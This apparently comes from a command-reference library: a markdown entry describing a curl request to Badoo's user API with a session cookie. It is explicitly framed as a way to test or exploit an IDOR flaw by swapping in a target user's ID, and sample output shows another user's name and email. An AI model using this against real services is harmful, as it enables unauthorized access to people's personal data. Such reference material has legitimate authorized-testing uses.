---
data: >-
  curl -X GET "https://badoo.com/api.phtml?SERVER_GET_USER=user_id" -H "Cookie:
  session=your_session_cookie" -v
tags:
  - api-testing
  - web
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 16ce99d7-6d52-45de-b634-d401da87a131
created_at: '2025-12-14T17:25:23.490Z'
updated_at: '2025-12-14T17:25:23.490Z'
verified: false
validated: true
submitted: true
---
# Curl Get User API

## Command

```bash
curl -X GET "https://badoo.com/api.phtml?SERVER_GET_USER=user_id" -H "Cookie: session=your_session_cookie" -v
```

## Description

This command uses curl to send an HTTP GET request to the Badoo API endpoint for retrieving user data, including a session cookie for authentication and verbose output for debugging. Replace 'user_id' with the target ID to test or exploit IDOR.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `SERVER_GET_USER=user_id` | Query parameter for the user object reference | Yes |
| `-H "Cookie: session=..."` | Authentication header with session cookie | Yes |
| `-v` | Verbose mode to show request/response details | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://badoo.com/api.phtml?SERVER_GET_USER=123" -H "Cookie: session=abc123"
```

### Advanced Usage

```bash
curl -X GET "https://badoo.com/api.phtml?SERVER_GET_USER=456" -H "Cookie: session=abc123" -v -o response.json
```

> Adds output to file for saving the response.

## Expected Output

Successful execution returns HTTP 200 with JSON containing user data (e.g., {"user_id":456,"name":"John Doe","email":"john@example.com"}). Verbose mode shows full headers and body. Errors may include 403 if authorization fails.

## Related

- [[Related Procedure: identify-idor-vulnerable-endpoint]]
- [[Related Procedure: exploit-idor-for-unauthorized-access]]
